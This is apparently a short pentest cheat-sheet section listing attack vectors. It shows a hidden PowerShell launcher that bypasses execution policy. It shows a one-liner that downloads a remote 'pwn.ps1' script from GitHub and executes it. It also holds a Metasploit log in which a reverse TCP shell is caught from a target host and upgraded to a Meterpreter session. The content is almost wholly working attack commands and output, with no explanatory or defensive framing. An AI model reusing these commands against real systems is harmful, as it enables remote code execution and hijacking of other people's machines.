## Vectors
###### Vector Payload
```
powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -encodedCommand
```
###### b64encode this
```
Invoke-Expression -Command (Invoke-WebRequest("https://raw.githubusercontent.com/tfairane/Pentest/master/Vectors/pwn.ps1")).content
```
#### Cmd.exe to Meterpreter
```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf exploit(handler) > set LHOST 192.168.0.21
LHOST => 192.168.0.21
msf exploit(handler) > exploit -j
[*] Exploit running as background job.

[*] Started reverse handler on 192.168.0.21:4444 
[*] Starting the payload handler...
msf exploit(handler) > [*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.0.19
[*] Command shell session 1 opened (192.168.0.21:4444 -> 192.168.0.19:59134) at 2015-10-29 22:35:53 +0100

msf exploit(handler) > sessions -l

Active sessions
===============

  Id  Type           Information  Connection
  --  ----           -----------  ----------
  1   shell windows               192.168.0.21:4444 -> 192.168.0.19:59134 (192.168.0.19)

msf exploit(handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse handler on 192.168.0.21:4433 
[*] Starting the payload handler...
[-] Powershell is not installed on the target.
[*] Command stager progress: 1.66% (1699/102108 bytes)
[*] Command stager progress: 3.33% (3398/102108 bytes)
[...]
[*] Command stager progress: 99.78% (101888/102108 bytes)
[*] Command stager progress: 100.00% (102108/102108 bytes)
```
